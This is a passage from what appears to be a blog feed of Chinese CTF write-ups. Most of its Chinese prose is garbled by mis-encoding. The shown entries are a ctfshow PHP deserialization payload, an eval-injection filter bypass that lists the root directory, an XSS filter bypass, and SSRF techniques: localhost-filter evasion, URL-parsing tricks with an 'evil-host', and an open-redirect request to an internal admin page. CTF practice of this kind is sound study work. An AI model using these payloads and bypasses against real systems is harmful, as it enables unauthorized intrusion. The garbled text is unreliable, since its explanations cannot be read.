punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÈÅá‰∏äÈ¢òÁöÑÂå∫Âà´Â∞±ÊòØÂ¢ûÂä†‰∫Ü‰∏Ä‰∏™Êù°‰ª∂<code>if($this-&gt;username!==$this-&gt;password)</code>Â∞±ÊòØusername‰∏çÁ≠â‰∫épassword„ÄÇÂÜô‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'dfgh'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøêË°åÂêéÂæóÂà∞<code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22dfgh%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D</code><br>ÂÖ∂‰Ωô‰∏é‰∏äÈ¢ò‰∏ÄÊ†∑„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Âçó‰∫¨Ê£ÆÊûóË≠¶ÂØüÂ≠¶Èô¢CTF</title>
      <link href="/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/"/>
      <url>/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ËøôÊòØ‰∏ÄÈÅìÊØîËæÉÁÆÄÂçïÁöÑwebÈ¢òÁõÆ"><a href="#ËøôÊòØ‰∏ÄÈÅìÊØîËæÉÁÆÄÂçïÁöÑwebÈ¢òÁõÆ" class="headerlink" title="ËøôÊòØ‰∏ÄÈÅìÊØîËæÉÁÆÄÂçïÁöÑwebÈ¢òÁõÆ"></a>ËøôÊòØ‰∏ÄÈÅìÊØîËæÉÁÆÄÂçïÁöÑwebÈ¢òÁõÆ</h2><p><img src="https://img-blog.csdnimg.cn/f5b19dbc39a34b3e9bf5650b3795ae5e.png" alt="1"><br>Â∞Ü‰∏âÂº†ÁÖßÁâáÈÉΩ‰øùÂ≠ò‰∏ãÊù•ÔºåÁÑ∂ÂêéÊãºÂõæ„ÄÇÂèëÁé∞Á¨¨‰∏ÄÂº†Âèç‰∫ÜÔºåÂ∞ÜÁ¨¨‰∏ÄÂº†ÂÄíÁΩÆËøáÊù•ÊãºÂõæÁÑ∂ÂêéÊâ´Á†Å<br><img src="https://img-blog.csdnimg.cn/755c10249c564270ab3d4f00f01c7b07.png" alt="2"><br>Êâ´ËøáÂêéÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/6938f6a4f37345738d5975c6a384ccc4.png" alt="3"><br>ÈÇ£Â∞±ËÆøÈóÆ&#x2F;vbnp.php<br>ÂæóÂà∞</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â∞Ü<strong>t</strong>  ,<strong>r</strong>   ,<strong>n</strong>,  <strong>‚Äò</strong>  ,<strong>‚Äú</strong>,  <strong>&#96;</strong>,  <strong>[</strong>,  <strong>]</strong>,  <strong>$</strong>,  *<em>*</em>,  <strong>^</strong>ËøáÊª§‰∫Ü</p><blockquote><p>var_dump() ÂáΩÊï∞Áî®‰∫éËæìÂá∫ÂèòÈáèÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ„ÄÇ<br>var_dump() ÂáΩÊï∞ÊòæÁ§∫ÂÖ≥‰∫é‰∏Ä‰∏™ÊàñÂ§ö‰∏™Ë°®ËææÂºèÁöÑÁªìÊûÑ‰ø°ÊÅØÔºåÂåÖÊã¨Ë°®ËææÂºèÁöÑÁ±ªÂûã‰∏éÂÄº„ÄÇÊï∞ÁªÑÂ∞ÜÈÄíÂΩíÂ±ïÂºÄÂÄºÔºåÈÄöËøáÁº©ËøõÊòæÁ§∫ÂÖ∂ÁªìÊûÑ„ÄÇ<br>Scandir()ÔºöÂàóÂá∫ ÂèÇÊï∞ÁõÆÂΩï ‰∏≠ÁöÑÊñá‰ª∂ÂíåÁõÆÂΩï</p></blockquote><p>**Âä†ËΩΩ?num&#x3D;var_dump(scandir(chr(47)))**‰πüÂ∞±ÊòØvar_dump(‚Äú&#x2F;‚Äú)ÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞flag„ÄÇ</p><h2 id="ÈªëÂøÉÁöÑÁΩëÁ´ô"><a href="#ÈªëÂøÉÁöÑÁΩëÁ´ô" class="headerlink" title="ÈªëÂøÉÁöÑÁΩëÁ´ô"></a>ÈªëÂøÉÁöÑÁΩëÁ´ô</h2><p><img src="https://img-blog.csdnimg.cn/53061123fbfa4e4983c58136f462d8f0.png" alt="1"><br>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://img-blog.csdnimg.cn/3e31a950eef94314959c25f74b06896c.png" alt="25"><br>dirsearchÊâ´‰∏Ä‰∏ãÂæóÂà∞Â§á‰ªΩÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/5c19ee13d99a4795b1a6fbc952613dec.png" alt="3"><br>ÂÜÖÂÆπ‰∏∫Ôºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//error_reporting(0);</span><span class="token comment">//ËÆæÁΩÆÈù∂Êú∫ÊâÄÂú®Ë∑ØÂæÑ</span><span class="token variable">$site_root</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/NFPC"</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÁΩÆ‰∏ä‰º†ÁõÆÂΩï</span><span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../upload/"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/f6421facbd144e92b789f7a2415345d8.png" alt="5"><br>ÊâæÂà∞<br><img src="https://img-blog.csdnimg.cn/af5a997fc70e43bf804179d0905dd5bc.png" alt="6"><br>ÂèëÁé∞xssÊºèÊ¥û<br><img src="https://img-blog.csdnimg.cn/476ec9c4fb6d4fd6977334c8f528999e.png" alt="7"><br>ÂèëÁé∞scriptË¢´ËøáÊª§Ôºå<br><img src="https://img-blog.csdnimg.cn/d5a6de988010492882ada878665ac939.png" alt="2"><strong>&lt;&gt;<strong>Ë¢´ËΩ¨‰πâÔºåÈÇ£Â∞±Èó≠Âêà<br><img src="https://img-blog.csdnimg.cn/6e25dae7e7734c799d07bd78fc542e68.png" alt="6"><br>ÊàêÂäüÔºÅÔºÅÔºÅ</strong>WAxiangxiangzuichaofan&#x2F;flag</strong><br>ÂæóÂà∞‰∏Ä‰∏™Êñá‰ª∂ÔºåÁúãÂà∞Êñá‰ª∂Â∞æÊúâÁâπÂæÅÔºåÁî®foremostÂàÜÁ¶ªÊñá‰ª∂Ôºå<br><img src="https://img-blog.csdnimg.cn/6d40bf494d20431aa41b44c8025e13df.png" alt="9">    </p><blockquote><pre><code>-V-ÊòæÁ§∫ÁâàÊùÉ‰ø°ÊÅØÂπ∂ÈÄÄÂá∫-t-ÊåáÂÆöÊñá‰ª∂Á±ªÂûã„ÄÇÔºà-t jpegÔºåpdf‚Ä¶Ôºâ-d-ÂêØÁî®Èó¥Êé•ÂùóÊ£ÄÊµãÔºàÂØπ‰∫éUNIXÊñá‰ª∂Á≥ªÁªüÔºâ-i-ÊåáÂÆöËæìÂÖ•Êñá‰ª∂ÔºàÈªòËÆ§‰∏∫stdinÔºâ-a-ÂÜôÂÖ•ÊâÄÊúâÊ†áÂ§¥Ôºå‰∏çÊâßË°åÈîôËØØÊ£ÄÊµãÔºàÊçüÂùèÁöÑÊñá‰ª∂Ôºâ-w-‰ªÖÂÜôÂÖ•ÂÆ°Ê†∏Êñá‰ª∂Ôºå‰∏çÂ∞Ü‰ªª‰ΩïÊ£ÄÊµãÂà∞ÁöÑÊñá‰ª∂ÂÜôÂÖ•Á£ÅÁõò-o-ËÆæÁΩÆËæìÂá∫ÁõÆÂΩïÔºàÈªòËÆ§‰∏∫ËæìÂá∫Ôºâ-c-ËÆæÁΩÆË¶Å‰ΩøÁî®ÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºàÈªòËÆ§‰∏∫forest.confÔºâ-q-ÂêØÁî®Âø´ÈÄüÊ®°Âºè„ÄÇÂú®512Â≠óËäÇËæπÁïå‰∏äÊâßË°åÊêúÁ¥¢„ÄÇ-Q-ÂêØÁî®ÈùôÈü≥Ê®°Âºè„ÄÇÊäëÂà∂ËæìÂá∫Ê∂àÊÅØ„ÄÇ-v-ÂÜó‰ΩôÊ®°Âºè„ÄÇÂ∞ÜÊâÄÊúâÊ∂àÊÅØËÆ∞ÂΩïÂà∞Â±èÂπï„ÄÇ</code></pre></blockquote><p>ÂæóÂà∞ÂàÜÁ¶ªÁöÑÊñá‰ª∂ÔºåÊúâflag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/09154bd7f7ab4779b08279e726f80343.png" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-SSRF</title>
      <link href="/2023/03/02/ctfshow-SSRF/"/>
      <url>/2023/03/02/ctfshow-SSRF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Â∏∏ËßÅÁªïËøá"><a href="#Â∏∏ËßÅÁªïËøá" class="headerlink" title="Â∏∏ËßÅÁªïËøá"></a>Â∏∏ËßÅÁªïËøá</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>ÂΩì<strong>127.0.0.1</strong>Ë¢´ËøáÊª§Êó∂ÔºåÂèØ‰ª•‰ΩøÁî®<strong>127.1</strong> <strong>0</strong> <strong>0.0.0.0</strong>  <strong>sudo.cc</strong> <strong>017700000001</strong> <strong>2130706433</strong> Á≠âÁ≠â„ÄÇÂ¶ÇÊûúÊüê‰∫õÂ≠óÁ¨¶‰∏≤Ë¢´ËøáÊª§‰∫ÜÔºåÂ∞ùËØïÂØπÂ≠óÁ¨¶‰∏≤ËøõË°å‰∏§Ê¨°urlÁºñÁ†Å„ÄÇ</p><h3 id="SSRFÂÖ∑ÊúâÂü∫‰∫éÁôΩÂêçÂçïÁöÑËæìÂÖ•ËøáÊª§Âô®"><a href="#SSRFÂÖ∑ÊúâÂü∫‰∫éÁôΩÂêçÂçïÁöÑËæìÂÖ•ËøáÊª§Âô®" class="headerlink" title="SSRFÂÖ∑ÊúâÂü∫‰∫éÁôΩÂêçÂçïÁöÑËæìÂÖ•ËøáÊª§Âô®"></a>SSRFÂÖ∑ÊúâÂü∫‰∫éÁôΩÂêçÂçïÁöÑËæìÂÖ•ËøáÊª§Âô®</h3><p>Êüê‰∫õÂ∫îÁî®Á®ãÂ∫èÂè™ÂÖÅËÆ∏‰∏éÂÖÅËÆ∏ÂÄºÁöÑÁôΩÂêçÂçïÂåπÈÖç„ÄÅ‰ª•ÂÖ∂ÂºÄÂ§¥ÊàñÂåÖÂê´ÂÖ∂ÁöÑËæìÂÖ•„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÊúâÊó∂ÂèØ‰ª•Âà©Áî®URLËß£Êûê‰∏≠ÁöÑ‰∏ç‰∏ÄËá¥ÊÄßÊù•ÁªïËøáËøáÊª§Âô®„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">URL</span>ËßÑËåÉÂåÖÂê´ËÆ∏Â§öÂú®ÂÆûÁé∞ÂØπ<span class="token constant">URL</span>ÁöÑÂç≥Â∏≠Ëß£ÊûêÂíåÈ™åËØÅÊó∂ÂÆπÊòìË¢´ÂøΩÁï•ÁöÑÁâπÊÄßÔºö<span class="token number">1</span>„ÄÅÂèØ‰ª•‰ΩøÁî®@Â≠óÁ¨¶Âú®‰∏ªÊú∫Âêç‰πãÂâçÁöÑ <span class="token constant">URL</span> ‰∏≠ÂµåÂÖ•Âá≠ÊçÆ„ÄÇ ‰æãÂ¶ÇÔºö    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>È¢ÑÊúü‰∏ªÊú∫<span class="token punctuation">)</span>@evil<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>ÊÅ∂ÊÑè‰∏ªÊú∫<span class="token punctuation">)</span><span class="token number">2</span>„ÄÅÂèØ‰ª•‰ΩøÁî® # Â≠óÁ¨¶Êù•Ë°®Á§∫ <span class="token constant">URL</span> ÁâáÊÆµ„ÄÇ‰æãÂ¶ÇÔºö    httpsÔºö<span class="token comment">//evil-host(ÊÅ∂ÊÑè‰∏ªÊú∫)#expected-host(È¢ÑÊúü‰∏ªÊú∫)</span><span class="token number">3</span>„ÄÅÂèØ‰ª•Âà©Áî®<span class="token constant">DNS</span>ÂëΩÂêçÂ±ÇÊ¨°ÁªìÊûÑÂ∞ÜÊâÄÈúÄÁöÑËæìÂÖ•ÊîæÂÖ•ÊÇ®ÊéßÂà∂ÁöÑÂÆåÂÖ®ÈôêÂÆö<span class="token constant">DNS</span>ÂêçÁß∞‰∏≠„ÄÇ‰æãÂ¶ÇÔºö    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span>host<span class="token punctuation">.</span>evil<span class="token operator">-</span>host<span class="token number">4</span>„ÄÅÂèØ‰ª•ÂØπÂ≠óÁ¨¶ËøõË°å<span class="token constant">URL</span>ÁºñÁ†Å‰ª•Ê∑∑Ê∑Ü<span class="token constant">URL</span>ÂàÜÊûê‰ª£Á†Å„ÄÇÂ¶ÇÊûúÂÆûÁé∞Á≠õÈÄâÂô®ÁöÑ‰ª£Á†Å‰∏éÊâßË°åÂêéÁ´Ø<span class="token constant">HTTP</span>ËØ∑Ê±ÇÁöÑ‰ª£Á†ÅÂ§ÑÁêÜ<span class="token constant">URL</span>ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶ÁöÑÊñπÂºè‰∏çÂêåÔºåÂàôËøô‰∏ÄÁÇπÁâπÂà´ÊúâÁî®<span class="token number">5</span>„ÄÅÂèØ‰ª•Â∞ÜËøô‰∫õÊäÄÊúØÁªìÂêà‰ΩøÁî®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá-SSRF-ËøáÊª§Âô®"><a href="#ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá-SSRF-ËøáÊª§Âô®" class="headerlink" title="ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá SSRF ËøáÊª§Âô®"></a>ÈÄöËøáÂºÄÊîæÈáçÂÆöÂêëÁªïËøá SSRF ËøáÊª§Âô®</h3><p>ÊúâÊó∂ÂèØ‰ª•ÈÄöËøáÂà©Áî®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÊù•ËßÑÈÅø‰ªª‰ΩïÁ±ªÂûãÁöÑÂü∫‰∫éËøáÊª§Âô®ÁöÑÈò≤Âæ°„ÄÇ</p><p>Âú®ÂâçÈù¢ÁöÑ SSRF Á§∫‰æã‰∏≠ÔºåÂÅáËÆæÁî®Êà∑Êèê‰∫§ÁöÑ URL Ë¢´‰∏•Ê†ºÈ™åËØÅ‰ª•Èò≤Ê≠¢ÊÅ∂ÊÑèÂà©Áî® SSRF Ë°å‰∏∫„ÄÇ‰ΩÜÊòØÔºåÂÖÅËÆ∏‰ΩøÁî® URL ÁöÑÂ∫îÁî®Á®ãÂ∫èÂ≠òÂú®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥û„ÄÇÂ¶ÇÊûúÁî®‰∫éÂèëÂá∫ÂêéÁ´Ø HTTP ËØ∑Ê±ÇÁöÑ API ÊîØÊåÅÈáçÂÆöÂêëÔºåÊÇ®ÂèØ‰ª•ÊûÑÂª∫‰∏Ä‰∏™Êª°Ë∂≥ËøáÊª§Âô®ÁöÑ URLÔºåÂπ∂Â∞ÜËØ∑Ê±ÇÈáçÂÆöÂêëÂà∞ÊâÄÈúÄÁöÑÂêéÁ´ØÁõÆÊ†á„ÄÇ</p><p>‰æãÂ¶ÇÔºåÂÅáËÆæÂ∫îÁî®Á®ãÂ∫èÂåÖÂê´‰∏Ä‰∏™ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÔºåÂÖ∂‰∏≠ÂåÖÂê´‰ª•‰∏ã URLÔºö</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ËøîÂõûÈáçÂÆöÂêëÂà∞Ôºö</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÂèØ‰ª•Âà©Áî®ÂºÄÊîæÈáçÂÆöÂêëÊºèÊ¥ûÁªïËøáURLËøáÊª§ÔºåÂà©Áî®SSRFÊºèÊ¥ûÔºåÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 118 stockApi&#x3D;http:&#x2F;&#x2F;weliketoshop.net&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;192.168.0.68&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Ê≠§ SSRF ÊºèÊ¥ûÂà©Áî®‰πãÊâÄ‰ª•ÊúâÊïàÔºåÊòØÂõ†‰∏∫Â∫îÁî®Á®ãÂ∫èÈ¶ñÂÖàÈ™åËØÅÊèê‰æõÁöÑ<code>stockAPI</code>URL ÊòØÂê¶‰Ωç‰∫éÂÖÅËÆ∏ÁöÑÂüü‰∏≠ÔºåËÄå‰∫ãÂÆûÁ°ÆÂÆûÂ¶ÇÊ≠§„ÄÇÁÑ∂ÂêéÂ∫îÁî®Á®ãÂ∫èËØ∑Ê±ÇÊèê‰æõÁöÑ URLÔºåËøô‰ºöËß¶ÂèëÊâìÂºÄÈáçÂÆöÂêë„ÄÇÂÆÉÈÅµÂæ™ÈáçÂÆöÂêëÔºåÂπ∂ÂêëÊîªÂáªËÄÖÈÄâÊã©ÁöÑÂÜÖÈÉ® URL ÂèëÂá∫ËØ∑Ê±Ç„ÄÇ</p><h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p><strong>352</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>353</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span 